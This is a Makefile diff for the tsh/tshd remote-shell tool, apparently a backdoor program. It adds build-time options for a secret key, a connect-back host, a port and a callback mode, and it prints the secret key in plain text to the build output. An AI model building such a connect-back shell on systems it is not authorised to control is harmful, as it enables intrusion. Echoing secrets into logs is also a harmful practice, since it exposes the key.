@@ -9,6 +9,26 @@ COMM		= pel.o aes.o sha1.o
 TSH		= tsh
 TSHD		= tshd
 
+ifdef SECRET_KEY
+DEFS		+= -DSECRET_KEY="\"$(SECRET_KEY)\""
+$(info [DEBUG] Building with SECRET_KEY: $(SECRET_KEY))
+endif
+
+ifdef CB_HOST
+DEFS		+= -DCB_HOST="\"$(CB_HOST)\""
+$(info [DEBUG] Building with CB_HOST: $(CB_HOST))
+endif
+
+ifdef SERVER_PORT
+DEFS		+= -DSERVER_PORT=$(SERVER_PORT)
+$(info [DEBUG] Building with SERVER_PORT: $(SERVER_PORT))
+endif
+
+ifdef CB_MODE
+DEFS		+= -DCB_MODE
+$(info [DEBUG] Building with CB_MODE enabled)
+endif
+
 VERSION=tsh-0.7
 CLIENT_OBJ=pel.c aes.c sha1.c  tsh.c
 SERVER_OBJ=pel.c aes.c sha1.c tshd.c
@@ -61,8 +81,8 @@ iphone:
 	ldid -S $(TSHD)
 
 linux:
-	gcc -O -W -Wall -o tsh  $(CLIENT_OBJ)
-	gcc -O -W -Wall -o tshd $(SERVER_OBJ) -lutil -DLINUX
+	gcc -O -W -Wall $(DEFS) -o tsh  $(CLIENT_OBJ)
+	gcc -O -W -Wall $(DEFS) -DLINUX -o tshd $(SERVER_OBJ) -lutil
 	strip tsh tshd
 
 linux_x64:
@@ -143,4 +163,3 @@ dist:
 	cp $(DISTFILES) $(VERSION)
 	tar -czf $(VERSION).tar.gz $(VERSION)
 	rm -r $(VERSION)
-
